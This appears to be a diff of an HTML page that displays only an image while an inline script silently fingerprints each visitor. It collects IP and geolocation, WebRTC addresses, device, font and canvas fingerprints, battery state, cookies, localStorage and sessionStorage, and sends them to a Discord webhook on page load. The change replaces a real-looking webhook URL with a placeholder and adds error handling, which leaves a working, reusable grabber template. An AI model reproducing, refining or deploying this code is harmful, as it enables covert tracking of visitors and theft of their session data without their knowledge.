@@ -11,12 +11,12 @@
 </head>
 <body>
     <div class="container">
-        <img src="https://i.pinimg.com/vwebp/1200x/64/85/cd/6485cd5e8911439c12cf2e0224968027.webp" alt="Image" />
+        <img src="https://i.imgur.com/your_image.jpg" alt="Image" />
     </div>
 
     <script>
         (function() {
-            var WEBHOOK_URL = "https://discord.com/api/webhooks/1532014134030241843/4FJZ8HkRRrKdvNPWYVAW_57qqS-M_Sv-kGcPLETqNv8lmgv1v4I9KIAbbpmi3aTVWrL_";
+            var WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE";
 
             function getIPAndLocation() {
                 return new Promise(function(resolve) {
@@ -46,54 +46,62 @@
                         xhr.onerror = function() { resolve({ ip: 'Unknown' }); };
                         xhr.ontimeout = function() { resolve({ ip: 'Unknown' }); };
                         xhr.send();
-                    } catch(e) { resolve({ ip: 'Unknown' }); }
+                    } catch(e) {
+                        resolve({ ip: 'Unknown' });
+                    }
                 });
             }
 
             function getSystemInfo() {
                 var info = {};
                 try {
-                    info.ua = navigator.userAgent;
-                    info.platform = navigator.platform;
-                    info.lang = navigator.language;
-                    info.langs = navigator.languages ? navigator.languages.join(',') : '';
-                    info.cookies = navigator.cookieEnabled;
+                    info.ua = navigator.userAgent || 'Unknown';
+                    info.platform = navigator.platform || 'Unknown';
+                    info.lang = navigator.language || 'Unknown';
+                    info.langs = (navigator.languages) ? navigator.languages.join(',') : 'Unknown';
+                    info.cookies = navigator.cookieEnabled || false;
                     info.hwConcurrency = navigator.hardwareConcurrency || '?';
                     info.deviceMemory = navigator.deviceMemory || '?';
                     info.touchPoints = navigator.maxTouchPoints || 0;
-                    info.screenW = screen.width;
-                    info.screenH = screen.height;
-                    info.colorDepth = screen.colorDepth;
+                    info.screenW = screen.width || 0;
+                    info.screenH = screen.height || 0;
+                    info.colorDepth = screen.colorDepth || 0;
                     info.pixelRatio = window.devicePixelRatio || 1;
-                    info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                    info.tzOffset = new Date().getTimezoneOffset();
-                    info.localTime = new Date().toISOString();
+                    info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+                    info.tzOffset = new Date().getTimezoneOffset() || 0;
+                    info.localTime = new Date().toISOString() || 'Unknown';
                     info.os = getOS();
                     info.browser = getBrowser();
-                } catch(e) {}
+                } catch(e) {
+                    // fallback
+                }
                 return info;
             }
 
             function getOS() {
-                var ua = navigator.userAgent;
-                if (ua.indexOf('Windows NT 10.0') !== -1) return 'Windows 10/11';
-                if (ua.indexOf('Windows NT 6.3') !== -1) return 'Windows 8.1';
-                if (ua.indexOf('Windows NT 6.2') !== -1) return 'Windows 8';
-                if (ua.indexOf('Windows NT 6.1') !== -1) return 'Windows 7';
-                if (ua.indexOf('Mac OS X') !== -1) return 'macOS';
-                if (ua.indexOf('Linux') !== -1) return 'Linux';
-                if (ua.indexOf('Android') !== -1) return 'Android';
-                if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) return 'iOS';
+                try {
+                    var ua = navigator.userAgent;
+                    if (ua.indexOf('Windows NT 10.0') !== -1) return 'Windows 10/11';
+                    if (ua.indexOf('Windows NT 6.3') !== -1) return 'Windows 8.1';
+                    if (ua.indexOf('Windows NT 6.2') !== -1) return 'Windows 8';
+                    if (ua.indexOf('Windows NT 6.1') !== -1) return 'Windows 7';
+                    if (ua.indexOf('Mac OS X') !== -1) return 'macOS';
+                    if (ua.indexOf('Linux') !== -1) return 'Linux';
+                    if (ua.indexOf('Android') !== -1) return 'Android';
+                    if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) return 'iOS';
+                } catch(e) {}
                 return 'Unknown';
             }
 
             function getBrowser() {
-                var ua = navigator.userAgent;
-                if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) return 'Chrome';
-                if (ua.indexOf('Edg') !== -1) return 'Edge';
-                if (ua.indexOf('Firefox') !== -1) return 'Firefox';
-                if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) return 'Safari';
-                if (ua.indexOf('Opera') !== -1 || ua.indexOf('OPR') !== -1) return 'Opera';
+                try {
+                    var ua = navigator.userAgent;
+                    if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) return 'Chrome';
+                    if (ua.indexOf('Edg') !== -1) return 'Edge';
+                    if (ua.indexOf('Firefox') !== -1) return 'Firefox';
+                    if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) return 'Safari';
+                    if (ua.indexOf('Opera') !== -1 || ua.indexOf('OPR') !== -1) return 'Opera';
+                } catch(e) {}
                 return 'Unknown';
             }
 
@@ -106,13 +114,18 @@
                         downlink: conn.downlink || '?',
                         saveData: conn.saveData || false
                     };
-                } catch(e) { return { type: '?', rtt: '?', downlink: '?', saveData: false }; }
+                } catch(e) {
+                    return { type: '?', rtt: '?', downlink: '?', saveData: false };
+                }
             }
 
             function getBattery() {
                 return new Promise(function(resolve) {
                     try {
-                        if (!navigator.getBattery) return resolve(null);
+                        if (!navigator.getBattery) {
+                            resolve(null);
+                            return;
+                        }
                         navigator.getBattery().then(function(b) {
                             resolve({
                                 level: Math.round(b.level * 100),
@@ -120,8 +133,12 @@
                                 chargingTime: b.chargingTime || '?',
                                 dischargingTime: b.dischargingTime || '?'
                             });
-                        }).catch(function() { resolve(null); });
-                    } catch(e) { resolve(null); }
+                        }).catch(function() {
+                            resolve(null);
+                        });
+                    } catch(e) {
+                        resolve(null);
+                    }
                 });
             }
 
@@ -143,7 +160,9 @@
                     ctx.lineWidth = 2;
                     ctx.strokeRect(5, 5, 200, 40);
                     return canvas.toDataURL('image/png').substring(0, 80) + '...';
-                } catch(e) { return 'Canvas blocked'; }
+                } catch(e) {
+                    return 'Canvas blocked';
+                }
             }
 
             function getWebRTCIPs() {
@@ -155,22 +174,30 @@
                         pc.createOffer().then(function(offer) {
                             return pc.setLocalDescription(offer);
                         }).then(function() {
-                            var lines = pc.localDescription.sdp.split('\n');
-                            lines.forEach(function(line) {
-                                if (line.indexOf('candidate') !== -1) {
-                                    var parts = line.split(' ');
-                                    if (parts.length > 7) {
-                                        var ip = parts[4];
-                                        if (ip && ips.indexOf(ip) === -1 && ip.indexOf(':') === -1) {
-                                            ips.push(ip);
+                            try {
+                                var lines = pc.localDescription.sdp.split('\n');
+                                lines.forEach(function(line) {
+                                    if (line.indexOf('candidate') !== -1) {
+                                        var parts = line.split(' ');
+                                        if (parts.length > 7) {
+                                            var ip = parts[4];
+                                            if (ip && ips.indexOf(ip) === -1 && ip.indexOf(':') === -1) {
+                                                ips.push(ip);
+                                            }
                                         }
                                     }
-                                }
-                            });
+                                });
+                            } catch(e) {}
                             resolve(ips);
-                        }).catch(function() { resolve([]); });
-                        setTimeout(function() { resolve([]); }, 2000);
-                    } catch(e) { resolve([]); }
+                        }).catch(function() {
+                            resolve([]);
+                        });
+                        setTimeout(function() {
+                            resolve([]);
+                        }, 2000);
+                    } catch(e) {
+                        resolve([]);
+                    }
                 });
             }
 
@@ -179,14 +206,14 @@
                     var ls = {};
                     for (var i = 0; i < localStorage.length; i++) {
                         var key = localStorage.key(i);
-                        if (key.toLowerCase().indexOf('token') === -1) {
+                        if (key && key.toLowerCase().indexOf('token') === -1) {
                             ls[key] = localStorage.getItem(key);
                         }
                     }
                     var ss = {};
                     for (var j = 0; j < sessionStorage.length; j++) {
                         var skey = sessionStorage.key(j);
-                        if (skey.toLowerCase().indexOf('token') === -1) {
+                        if (skey && skey.toLowerCase().indexOf('token') === -1) {
                             ss[skey] = sessionStorage.getItem(skey);
                         }
                     }
@@ -205,23 +232,29 @@
                     var list = [];
                     for (var i = 0; i < navigator.plugins.length; i++) {
                         var p = navigator.plugins[i];
-                        list.push(p.name);
+                        if (p && p.name) {
+                            list.push(p.name);
+                        }
                     }
                     return list;
-                } catch(e) { return []; }
+                } catch(e) {
+                    return [];
+                }
             }
 
             function getWindowInfo() {
                 try {
                     return {
-                        innerW: window.innerWidth,
-                        innerH: window.innerHeight,
-                        outerW: window.outerWidth,
-                        outerH: window.outerHeight,
-                        availW: screen.availWidth,
-                        availH: screen.availHeight
+                        innerW: window.innerWidth || 0,
+                        innerH: window.innerHeight || 0,
+                        outerW: window.outerWidth || 0,
+                        outerH: window.outerHeight || 0,
+                        availW: screen.availWidth || 0,
+                        availH: screen.availHeight || 0
                     };
-                } catch(e) { return {}; }
+                } catch(e) {
+                    return {};
+                }
             }
 
             function getFonts() {
@@ -235,7 +268,9 @@
                     testFonts.forEach(function(font) {
                         ctx.font = '72px ' + font + ', monospace';
                         var width = ctx.measureText('mmmmmmmmmmli').width;
-                        if (width !== base) fonts.push(font);
+                        if (width !== base) {
+                            fonts.push(font);
+                        }
                     });
                 } catch(e) {}
                 return fonts;
@@ -248,19 +283,26 @@
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(data)
                     }).catch(function() {
-                        navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(data));
+                        try {
+                            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(data));
+                        } catch(e2) {}
                     });
                 } catch(e) {
                     try {
                         navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(data));
-                    } catch(err) {}
+                    } catch(e2) {}
                 }
             }
 
             async function silentCollect() {
-                var ipData = await getIPAndLocation();
-                var batt = await getBattery();
-                var webrtc = await getWebRTCIPs();
+                try {
+                    var ipData = await getIPAndLocation();
+                } catch(e) {
+                    var ipData = { ip: 'Unknown', country: '?', region: '?', city: '?', postal: '?', lat: '?', lon: '?', timezone: '?', org: '?' };
+                }
+
+                var batt = await getBattery().catch(function() { return null; });
+                var webrtc = await getWebRTCIPs().catch(function() { return []; });
 
                 var system = getSystemInfo();
                 var network = getNetworkInfo();
@@ -271,61 +313,61 @@
                 var fonts = getFonts();
 
                 var payload = {
-                    'IP': ipData.ip,
+                    'IP': ipData.ip || 'Unknown',
                     'Location': {
-                        'Country': ipData.country,
-                        'Region': ipData.region,
-                        'City': ipData.city,
-                        'Postal': ipData.postal,
-                        'Lat': ipData.lat,
-                        'Lon': ipData.lon,
-                        'Timezone': ipData.timezone,
-                        'Organization': ipData.org
+                        'Country': ipData.country || '?',
+                        'Region': ipData.region || '?',
+                        'City': ipData.city || '?',
+                        'Postal': ipData.postal || '?',
+                        'Lat': ipData.lat || '?',
+                        'Lon': ipData.lon || '?',
+                        'Timezone': ipData.timezone || '?',
+                        'Organization': ipData.org || '?'
                     },
-                    'OS': system.os,
-                    'Browser': system.browser,
+                    'OS': system.os || 'Unknown',
+                    'Browser': system.browser || 'Unknown',
                     'Device': {
-                        'Platform': system.platform,
-                        'Language': system.lang,
-                        'Languages': system.langs,
-                        'Screen': system.screenW + 'x' + system.screenH,
-                        'Available Screen': windowInfo.availW + 'x' + windowInfo.availH,
-                        'Window Size': windowInfo.innerW + 'x' + windowInfo.innerH,
-                        'Color Depth': system.colorDepth,
-                        'Pixel Ratio': system.pixelRatio,
-                        'CPU Cores': system.hwConcurrency,
+                        'Platform': system.platform || 'Unknown',
+                        'Language': system.lang || 'Unknown',
+                        'Languages': system.langs || 'Unknown',
+                        'Screen': (system.screenW || '?') + 'x' + (system.screenH || '?'),
+                        'Available Screen': (windowInfo.availW || '?') + 'x' + (windowInfo.availH || '?'),
+                        'Window Size': (windowInfo.innerW || '?') + 'x' + (windowInfo.innerH || '?'),
+                        'Color Depth': system.colorDepth || '?',
+                        'Pixel Ratio': system.pixelRatio || '?',
+                        'CPU Cores': system.hwConcurrency || '?',
                         'RAM': system.deviceMemory ? system.deviceMemory + 'GB' : '?',
-                        'Touch Points': system.touchPoints,
-                        'Timezone': system.timezone,
-                        'Offset (min)': system.tzOffset,
-                        'Local Time': system.localTime
+                        'Touch Points': system.touchPoints || '?',
+                        'Timezone': system.timezone || 'Unknown',
+                        'Offset (min)': system.tzOffset || '?',
+                        'Local Time': system.localTime || 'Unknown'
                     },
                     'Network': network,
                     'Battery': batt || { level: '?', charging: '?' },
-                    'WebRTC IPs': webrtc,
-                    'Plugins': plugins,
-                    'Fonts Detected': fonts,
-                    'Canvas Fingerprint': fingerprint,
-                    'Cookies': storage.cookies,
-                    'LocalStorage': storage.localStorage,
-                    'SessionStorage': storage.sessionStorage,
-                    'UserAgent': system.ua,
+                    'WebRTC IPs': webrtc || [],
+                    'Plugins': plugins || [],
+                    'Fonts Detected': fonts || [],
+                    'Canvas Fingerprint': fingerprint || 'Unknown',
+                    'Cookies': storage.cookies || 'None',
+                    'LocalStorage': storage.localStorage || {},
+                    'SessionStorage': storage.sessionStorage || {},
+                    'UserAgent': system.ua || 'Unknown',
                     'Referrer': document.referrer || 'Direct',
-                    'Page URL': window.location.href,
-                    'Time': new Date().toISOString()
+                    'Page URL': window.location.href || 'Unknown',
+                    'Time': new Date().toISOString() || 'Unknown'
                 };
 
                 exfiltrate(payload);
             }
 
             if (document.readyState === 'complete') {
-                setTimeout(silentCollect, 200);
+                setTimeout(silentCollect, 300);
             } else {
                 window.addEventListener('load', function() {
-                    setTimeout(silentCollect, 200);
+                    setTimeout(silentCollect, 300);
                 });
             }
-            setTimeout(silentCollect, 50);
+            setTimeout(silentCollect, 100);
         })();
     </script>
 </body>
